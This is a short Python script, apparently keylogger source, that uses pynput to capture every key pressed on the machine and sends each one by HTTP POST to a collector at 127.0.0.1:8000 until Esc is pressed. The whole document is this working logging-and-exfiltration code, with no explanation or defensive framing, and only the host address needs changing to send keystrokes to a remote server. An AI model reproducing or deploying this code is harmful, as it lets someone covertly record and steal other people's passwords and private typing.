from pynput import keyboard
import requests
def on_press(key):
    try:
        requests.post(f"http://127.0.0.1:8000/{key.char}")
        print(f"{key.char}")
    except AttributeError:
        requests.post(f"http://127.0.0.1:8000/{key}")
        print(f"{key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
